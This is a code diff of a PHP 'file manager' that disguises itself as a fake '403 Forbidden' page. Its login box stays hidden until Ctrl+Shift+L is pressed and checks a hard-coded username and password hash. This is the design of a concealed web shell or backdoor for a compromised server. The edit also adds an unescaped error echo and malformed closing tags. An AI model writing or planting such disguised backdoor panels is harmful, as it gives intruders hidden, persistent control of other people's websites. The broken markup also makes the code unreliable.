@@ -1,34 +1,13 @@
 <?php
+
 session_start();
-
-/*
-|--------------------------------------------------------------------------
-| SABO Luxury Purple File Manager
-|--------------------------------------------------------------------------
-| Username : sabo
-| Password : password
-|--------------------------------------------------------------------------
-*/
-
-// Aktifkan error reporting untuk debugging.
-// NONAKTIFKAN display_errors di production.
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
-/*
-|--------------------------------------------------------------------------
-| LOGIN CREDENTIALS
-|--------------------------------------------------------------------------
-*/
 const USERNAME = 'sabo';
 const HASHED_PASSWORD = '$2y$10$9fkuaem3/CyLRtb681aakuSBuUqZCvvqYZpEkfm7jImcCtEP0jn4i';
 
-/*
-|--------------------------------------------------------------------------
-| DELETE FOLDER RECURSIVE
-|--------------------------------------------------------------------------
-*/
 function deleteFolderRecursive($folder)
 {
     if (!is_dir($folder)) {
@@ -52,11 +31,6 @@ function deleteFolderRecursive($folder)
     return @rmdir($folder);
 }
 
-/*
-|--------------------------------------------------------------------------
-| LOGOUT
-|--------------------------------------------------------------------------
-*/
 if (isset($_GET['logout'])) {
     session_destroy();
 
@@ -64,11 +38,6 @@ if (isset($_GET['logout'])) {
     exit;
 }
 
-/*
-|--------------------------------------------------------------------------
-| LOGIN
-|--------------------------------------------------------------------------
-*/
 if (!isset($_SESSION['logged_in'])) {
 
     if (isset($_POST['username']) && isset($_POST['password'])) {
@@ -88,352 +57,95 @@ if (!isset($_SESSION['logged_in'])) {
     ?>
 
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>SABO Console - 403 Forbidden</title>
-
-    <style>
-
-        * {
-            box-sizing: border-box;
-        }
-
-        html,
-        body {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            min-height: 100%;
-        }
-
-        body {
-            background:
-                radial-gradient(
-                    circle at 15% 20%,
-                    rgba(139, 92, 246, .20),
-                    transparent 30%
-                ),
-                radial-gradient(
-                    circle at 85% 80%,
-                    rgba(168, 85, 247, .16),
-                    transparent 30%
-                ),
-                linear-gradient(
-                    135deg,
-                    #050008 0%,
-                    #0d0018 45%,
-                    #17002d 100%
-                );
-
-            color: #c084fc;
-            font-family: "Courier New", monospace;
-            overflow: hidden;
-        }
-
-        .forbidden-page {
-            padding: 50px;
-            color: #d8b4fe;
-        }
-
-        .forbidden-page h1 {
-            color: #c084fc;
-            text-shadow: 0 0 15px rgba(192, 132, 252, .65);
-        }
-
-        .forbidden-page p {
-            color: #a78bfa;
-        }
-
-        .forbidden-page hr {
-            border: 0;
-            border-top: 1px solid rgba(168, 85, 247, .25);
-        }
-
-        #loginBox {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-
-            width: min(390px, calc(100% - 40px));
-
-            padding: 30px;
-
-            background:
-                linear-gradient(
-                    145deg,
-                    rgba(26, 4, 45, .97),
-                    rgba(8, 2, 15, .98)
-                );
-
-            border: 1px solid #8b5cf6;
-            border-radius: 16px;
-
-            color: #d8b4fe;
-
-            display: none;
-
-            box-shadow:
-                0 0 15px rgba(139, 92, 246, .25),
-                0 0 60px rgba(126, 34, 206, .12),
-                inset 0 0 30px rgba(139, 92, 246, .04);
-
-            font-family: "Courier New", monospace;
-        }
-
-        #loginBox::before {
-            content: "";
-            display: block;
-            height: 3px;
-            margin: -30px -30px 25px -30px;
-
-            background:
-                linear-gradient(
-                    90deg,
-                    transparent,
-                    #7c3aed,
-                    #c084fc,
-                    #7c3aed,
-                    transparent
-                );
-        }
-
-        #loginBox strong {
-            color: #e9d5ff;
-            font-size: 18px;
-            text-shadow: 0 0 10px rgba(192, 132, 252, .7);
-        }
-
-        #loginBox span {
-            color: #a78bfa;
-        }
-
-        #loginBox label {
-            display: block;
-            margin-bottom: 5px;
-            color: #c084fc;
-        }
-
-        #loginBox input[type="text"],
-        #loginBox input[type="password"] {
-            width: 100%;
-
-            background: rgba(5, 0, 10, .85);
-
-            border: 0;
-            border-bottom: 1px solid #7c3aed;
-
-            color: #f3e8ff;
-
-            padding: 10px 5px;
-            margin-bottom: 20px;
-
-            font-family: inherit;
-            outline: none;
-
-            transition: .25s ease;
-        }
-
-        #loginBox input[type="text"]:focus,
-        #loginBox input[type="password"]:focus {
-            border-bottom: 2px solid #c084fc;
-
-            box-shadow:
-                0 8px 20px rgba(139, 92, 246, .10);
-        }
-
-        #loginBox button[type="submit"] {
-            width: 100%;
-
-            background:
-                linear-gradient(
-                    135deg,
-                    #6d28d9,
-                    #9333ea,
-                    #7c3aed
-                );
-
-            border: 1px solid #a855f7;
-
-            color: #fff;
-
-            padding: 11px;
-
-            border-radius: 8px;
-
-            font-family: inherit;
-            font-weight: bold;
-
-            cursor: pointer;
-
-            transition: .25s ease;
-
-            box-shadow:
-                0 0 15px rgba(139, 92, 246, .25);
-        }
-
-        #loginBox button[type="submit"]:hover {
-            transform: translateY(-1px);
-
-            box-shadow:
-                0 0 25px rgba(168, 85, 247, .45);
-
-            background:
-                linear-gradient(
-                    135deg,
-                    #7c3aed,
-                    #a855f7
-                );
-        }
-
-        .error-message {
-            color: #fda4af;
-
-            margin-bottom: 15px;
-
-            font-weight: bold;
-
-            background: rgba(127, 29, 29, .18);
-
-            border: 1px solid rgba(244, 63, 94, .35);
-
-            border-radius: 7px;
-
-            padding: 10px;
-        }
-
-        .console-line {
-            margin-bottom: 25px;
-            line-height: 1.7;
-        }
-
-        .cursor {
-            display: inline-block;
-            width: 8px;
-            height: 15px;
-            background: #c084fc;
-            animation: blink 1s infinite;
-            vertical-align: middle;
-        }
-
-        @keyframes blink {
-            0%, 45% {
-                opacity: 1;
-            }
-
-            46%, 100% {
-                opacity: 0;
-            }
-        }
-
-    </style>
-
+<title>403 Forbidden</title>
+<style>
+#loginBox {
+position: fixed;
+top: 50%;
+left: 50%;
+transform: translate(-50%, -50%);
+background: #000;
+padding: 20px;
+border: 2px solid rgb(132, 0, 255);
+width: 350px;
+color: rgb(132, 0, 255);
+display: none;
+box-shadow: 0 0 15px rgba(204, 0, 255, 0.5);
+font-family: 'Courier New', monospace;
+}
+#loginBox strong, #loginBox span {
+color: #c300ff;
+}
+#loginBox input[type="text"],
+#loginBox input[type="password"] {
+width: 100%;
+background: #000;
+border: none;
+border-bottom: 1px solid rgb(132, 0, 255);
+color: rgb(132, 0, 255);
+padding: 5px;
+margin-bottom: 15px;
+font-family: inherit;
+outline: none;
+}
+#loginBox input[type="text"]:focus,
+#loginBox input[type="password"]:focus {
+border-bottom: 2px solid #c300ff;
+}
+#loginBox button[type="submit"] {
+width: 100%;
+background: #000;
+border: 1px solid rgb(132, 0, 255);
+color: rgb(132, 0, 255);
+padding: 8px;
+font-family: inherit;
+cursor: pointer;
+transition: background-color 0.3s, color 0.3s, border-color 0.3s;
+}
+#loginBox button[type="submit"]:hover {
+background: rgb(132, 0, 255);
+color: #000;
+border-color: rgb(132, 0, 255);
+}
+.error-message {
+color: #f00;
+margin-bottom: 10px;
+font-weight: bold;
+}
+</style>
 </head>
-
 <body>
-
-    <div class="forbidden-page">
-
-        <h1>Forbidden</h1>
-
-        <p>
-            You don't have permission to access
-            <?= htmlspecialchars($_SERVER['PHP_SELF']) ?>
-            on this server.
-        </p>
-
-        <hr>
-
-    </div>
-
-    <div id="loginBox">
-
-        <div class="console-line">
-
-            <strong>SABO Console</strong><br>
-
-            <span>
-                system@SABO:~$ authentication_required
-            </span>
-
-            <br>
-
-            <span>
-                login:
-            </span>
-
-            <span class="cursor"></span>
-
-        </div>
-
-        <?php if (isset($error)): ?>
-
-            <div class="error-message">
-                <?= htmlspecialchars($error) ?>
-            </div>
-
-        <?php endif; ?>
-
-        <form method="post">
-
-            <label>
-                Username
-            </label>
-
-            <input
-                type="text"
-                name="username"
-                autocomplete="username"
-                required
-            >
-
-            <label>
-                Password
-            </label>
-
-            <input
-                type="password"
-                name="password"
-                autocomplete="current-password"
-                required
-            >
-
-            <button type="submit">
-                ACCESS CONSOLE
-            </button>
-
-        </form>
-
-    </div>
-
-    <script>
+<h1>Forbidden</h1>
+<p>You don't have permission to access <?= htmlspecialchars($_SERVER['PHP_SELF']) ?> on this server.</p>
+<hr>
+<div id="loginBox">
+<div style="margin-bottom:10px;">
+<strong>Linux Console</strong><br>
+<span>login: </span>
+</div>
+<?php if (isset($error)) echo '<div class="error-message">' . $error . '</div>'; ?>
+<form method="post">
+<label>Username</label><br>
+<input type="text" name="username" required><br>
+<label>Password</label><br>
+<input type="password" name="password" required><br>
+<button type="submit">Login</button>
+</form>
+</div>
+<script>
 
         document.addEventListener('keydown', function(e) {
-
-            if (
-                e.ctrlKey &&
-                e.shiftKey &&
-                e.key.toUpperCase() === 'L'
-            ) {
-
-                const box = document.getElementById('loginBox');
-
-                box.style.display =
-                    box.style.display === 'none'
-                        ? 'block'
-                        : 'none';
+            if (e.ctrlKey && e.shiftKey && e.key === 'L') {
+                var box = document.getElementById('loginBox');
+                // Toggle visibility
+                box.style.display = box.style.display === 'none' ? 'block' : 'none';
             }
-
         });
-
-    </script>
-
-</body>
-</html>
+    \</script>
+\</body>
+\</html>
 
 <?php
     exit;
